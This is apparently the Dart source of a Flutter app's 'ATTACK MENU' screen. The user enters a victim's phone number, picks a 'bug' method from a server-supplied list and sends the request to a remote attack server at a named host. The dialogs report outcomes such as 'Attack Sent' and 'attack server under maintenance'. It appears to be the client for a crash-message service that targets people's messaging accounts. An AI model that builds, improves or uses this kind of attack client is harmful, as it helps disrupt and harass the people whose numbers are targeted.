import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with SingleTickerProviderStateMixin {
  late String key;
  late List<Map<String, dynamic>> bugs;
  String? selectedBugId;
  final targetController = TextEditingController();
  bool isLoading = false;

  // -- COLORS --
  final Color _primaryAccent = const Color(0xFFD500F9);
  final Color _bgTop = const Color(0xFF2E004B);
  final Color _bgBottom = const Color(0xFF0F001A);
  final Color _cardBg = const Color(0xFF1A0B2E).withOpacity(0.8);

  late AnimationController _animController;
  late Animation<double> _fadeAnim;

  @override
  void initState() {
    super.initState();
    key = widget.sessionKey;
    bugs = widget.listBug;
    if (bugs.isNotEmpty) {
      selectedBugId = bugs[0]['bug_id'];
    }

    _animController = AnimationController(
      duration: const Duration(milliseconds: 800),
      vsync: this,
    );
    _fadeAnim = CurvedAnimation(parent: _animController, curve: Curves.easeIn);
    _animController.forward();
  }

  @override
  void dispose() {
    _animController.dispose();
    targetController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    String cleaned = input.replaceAll(RegExp(r'[^\d+]'), ''); // Izinkan tanda '+'
    if (cleaned.startsWith('0')) {
       // Opsi: Bisa otomatis ubah 08xxx jadi 628xxx jika mau, tapi sementara kita return null sesuai request awal
       return null;
    }
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);

    if (target == null || target.isEmpty || (!target.startsWith('+') && target.startsWith('0'))) {
       _showAlert("❌ Invalid Number", "Gunakan format internasional (e.g. +628xx atau 628xx). Jangan awali dengan '0'.");
      return;
    }

    if (selectedBugId == null) {
        _showAlert("⚠️ Error", "Please select a bug method first.");
        return;
    }

    setState(() => isLoading = true);

    try {
      final url = Uri.parse("http://hcr-1.heppyhost.my.id:25583/sendBug?key=$key&target=$target&bug=$selectedBugId");
      final res = await http.get(url).timeout(const Duration(seconds: 30)); // Tambah timeout
      
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data["cooldown"] == true) {
          _showAlert("⏳ Cooldown", "Please wait before sending another attack.");
        } else if (data["valid"] == false) {
          _showAlert("🚫 Invalid Session", "Your session has expired or is invalid.\nPlease relogin.");
        } else if (data["sended"] == false) {
          _showAlert("🔧 Maintenance", "The attack server is currently under maintenance.");
        } else {
          _showAlert("🚀 Attack Sent", "Successfully launched attack on $target using method $selectedBugId.");
        }
      } else {
         _showAlert("⚠️ Server Error", "Server returned status code: ${res.statusCode}");
      }
    } catch (e) {
      _showAlert("🌐 Connection Failed", "Failed to connect to server.\nCheck your internet.");
    } finally {
      if (mounted) setState(() => isLoading = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _bgTop,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _primaryAccent.withOpacity(0.5))),
        title: Text(title,
            style: TextStyle(color: _primaryAccent, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
        content: Text(message, style: const TextStyle(color: Colors.white70)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: _primaryAccent, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        title: Text("ATTACK MENU",
            style: TextStyle(
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                letterSpacing: 1.5,
                color: _primaryAccent)),
        backgroundColor: Colors.transparent,
        elevation: 0,
        iconTheme: IconThemeData(color: _primaryAccent),
      ),
      body: Container(
        height: double.infinity,
        width: double.infinity,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [_bgTop, _bgBottom],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
        ),
        child: SafeArea(
          child: FadeTransition(
            opacity: _fadeAnim,
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 25, vertical: 20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  const SizedBox(height: 30), 

                  Center(
                    child: Container(
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(color: _primaryAccent.withOpacity(0.2), blurRadius: 20, spreadRadius: 2)
                        ]
                      ),
                      child: CircleAvatar(
                        radius: 50,
                        backgroundColor: Colors.transparent,
                        backgroundImage: const AssetImage('assets/images/logo.jpg'),
                      ),
                    ),
                  ),
                  const SizedBox(height: 30),

                  Text(
                    "Enter Target & Select Bug",
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: _primaryAccent,
                      fontSize: 22,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.2,
                      shadows: [
                        Shadow(color: _primaryAccent.withOpacity(0.5), blurRadius: 10)
                      ]
                    ),
                  ),
                  const Divider(color: Colors.white, thickness: 0.4),
                  const SizedBox(height: 30),
                  
                  // --- TARGET INPUT ---
                  Text("TARGET INPUT", style: TextStyle(color: _primaryAccent, fontFamily: 'Orbitron', fontSize: 14, letterSpacing: 1.2)),
                  const SizedBox(height: 10),
                  _glassContainer(
                    child: TextField(
                      controller: targetController,
                      style: const TextStyle(color: Colors.white, fontSize: 16),
                      keyboardType: TextInputType.phone,
                      decoration: InputDecoration(
                        hintText: "Target number (e.g. +62 812xxxx)",
                        hintStyle: TextStyle(color: Colors.white.withOpacity(0.3)),
                        // --- PERBAIKAN: Mengganti ikon menjadi icon phone ---
                        prefixIcon: Icon(Icons.phone_outlined, color: _primaryAccent), 
                        border: InputBorder.none,
                        contentPadding: const EdgeInsets.symmetric(vertical: 15, horizontal: 20),
                      ),
                    ),
                  ),
                  const SizedBox(height: 25),

                  // --- METHOD SELECTION ---
                  Text("SELECT BUG", style: TextStyle(color: _primaryAccent, fontFamily: 'Orbitron', fontSize: 14, letterSpacing: 1.2)),
                  const SizedBox(height: 10),
                  _glassContainer(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 5),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: selectedBugId,
                        dropdownColor: _bgTop,
                        icon: Icon(Icons.arrow_drop_down_circle_outlined, color: _primaryAccent),
                        isExpanded: true,
                        hint: Text("Bug Type", style: TextStyle(color: Colors.white.withOpacity(0.3))),
                        style: const TextStyle(color: Colors.white, fontSize: 16),
                        items: bugs.map((bug) {
                          return DropdownMenuItem<String>(
                            value: bug['bug_id'].toString(),
                            child: Text(bug['bug_name'] ?? "Unknown Bug"),
                          );
                        }).toList(),
                        onChanged: (val) => setState(() => selectedBugId = val),
                      ),
                    ),
                  ),
                  const SizedBox(height: 50),

                  // --- SEND BUTTON ---
                   Container(
                    height: 55,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(15),
                      gradient: LinearGradient(
                        colors: [_primaryAccent, _primaryAccent.withOpacity(0.6)],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight
                      ),
                      boxShadow: [
                        BoxShadow(color: _primaryAccent.withOpacity(0.4), blurRadius: 15, offset: const Offset(0, 5))
                      ]
                    ),
                     child: ElevatedButton(
                      onPressed: isLoading ? null : _sendBug,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        shadowColor: Colors.transparent,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
                      ),
                      child: isLoading 
                        ? const SizedBox(height: 25, width: 25, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 3))
                        : Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: const [
                              Icon(Icons.rocket_launch_outlined, color: Colors.white),
                              SizedBox(width: 10),
                              Text("SEND BUG", style: TextStyle(color: Colors.white, fontSize: 18, fontFamily: 'Orbitron', fontWeight: FontWeight.bold, letterSpacing: 1.2)),
                            ],
                          ),
                                         ),
                   ),

                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _glassContainer({required Widget child, EdgeInsetsGeometry? padding}) {
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        color: _cardBg,
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: _primaryAccent.withOpacity(0.3), width: 1),
         boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.2),
              blurRadius: 10,
              offset: const Offset(0, 5),
            ),
          ],
      ),
      child: child,
    );
  }
}